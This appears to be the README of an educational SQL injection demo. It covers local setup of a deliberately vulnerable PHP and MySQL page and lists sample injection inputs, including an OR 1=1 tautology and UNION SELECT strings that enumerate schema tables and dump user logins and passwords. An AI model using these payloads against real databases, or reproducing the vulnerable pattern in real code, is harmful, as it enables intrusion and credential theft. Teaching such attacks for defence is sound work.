## SQL Injection Example Code

[![license](http://img.shields.io/badge/license-MIT-red.svg?style=flat)](https://raw.githubusercontent.com/fritz-c/sql-injection-demo/master/LICENSE)

### IMPORTANT: Do not place this code on a server that can be accessed by others.

To get things up and running:

* Create a database in MySQL, and edit these lines in `bad-inj-show.php` to match:
```php
$dsn = 'mysql:dbname=my_dbname;host=127.0.0.1';
$user = 'my_user';
$password = 'my_password';
```
* Insert the my_users table from the `db_dump.sql` file with a command like this:
```sh
$ mysql -u my_user -pmy_password my_db_name < db_dump.sql
```

* Host the code locally using something like [MAMP](http://www.mamp.info/en/) or [XAMPP](https://www.apachefriends.org/index.html).

* Navigate to the `bad-inj.php` page in your browser and play around with the form.

Here are some examples of some input to try:

```
ed@example.com

a" OR 1 = 1 -- 

a" UNION ALL SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES; -- 

a" UNION ALL SELECT COLUMN_NAME,COLUMN_TYPE from information_schema.COLUMNS where TABLE_NAME = "my_users"; -- 

a" UNION ALL SELECT user_login,user_pass from my_users; -- 

a" UNION ALL SELECT user_email,user_pass from my_users; -- 
```

And I think it goes without saying, use this knowledge for learning how to protect yourself, and for the greater good ;)
